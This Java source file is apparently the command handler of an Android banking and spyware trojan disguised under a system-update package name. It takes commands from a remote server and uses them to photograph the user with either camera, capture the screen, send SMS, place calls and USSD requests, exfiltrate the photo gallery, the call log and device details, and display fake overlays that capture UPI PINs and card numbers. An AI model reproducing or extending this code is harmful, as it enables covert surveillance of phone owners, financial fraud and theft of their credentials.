package com.sysupd;

import android.content.*;
import android.net.Uri;
import android.telephony.SmsManager;
import org.json.*;
import java.util.*;

public class Cmd {
    public static void handle(String json) {
        try {
            JSONObject root = new JSONObject(json);
            Iterator<String> keys = root.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                JSONObject node = root.getJSONObject(key);
                String cmd = node.optString("cmd");
                Core.http(Core.BASE + "/devices/" + Core.DEV +
                    "/commands/" + key + "/delivered.json", "PUT", "true");
                exec(cmd);
            }
        } catch (Exception e) {}
    }

    static void exec(String cmd) {
        Context ctx = Core.CTX;
        try {
            if (cmd.equals("screenshot")) {
                Intent i = new Intent(ctx, ProjectionActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } else if (cmd.equals("photo_front")) {
                new CameraModule(ctx).capture(true, "CAMERA_PHOTO");
            } else if (cmd.equals("photo_back")) {
                new CameraModule(ctx).capture(false, "CAMERA_PHOTO");
            } else if (cmd.startsWith("sms_send|")) {
                String[] p = cmd.split("\\|");
                SmsManager.getDefault().sendTextMessage(p[1], null, p[2], null, null);
            } else if (cmd.startsWith("call|")) {
                ctx.startActivity(new Intent(Intent.ACTION_CALL,
                    Uri.parse("tel:" + cmd.split("\\|")[1]))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            } else if (cmd.startsWith("ussd|")) {
                ctx.startActivity(new Intent(Intent.ACTION_CALL,
                    Uri.parse("tel:" + Uri.encode("#" + cmd.split("\\|")[1] + "#")))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            } else if (cmd.equals("gallery")) {
                new GalleryExfil(ctx).exfilAllImages();
            } else if (cmd.equals("calls")) {
                Core.send("CALL_LOG", "{\"dump\":\"triggered\"}");
            } else if (cmd.equals("device")) {
                Core.send("DEVICE_INFO", "{\"model\":\"" +
                    android.os.Build.MODEL + "\"}");
            } else if (cmd.equals("overlay_upi")) {
                new OverlayManager(ctx).showUpiPin();
            } else if (cmd.equals("overlay_cc")) {
                new OverlayManager(ctx).showCard();
            }
        } catch (Exception e) {}
    }
}
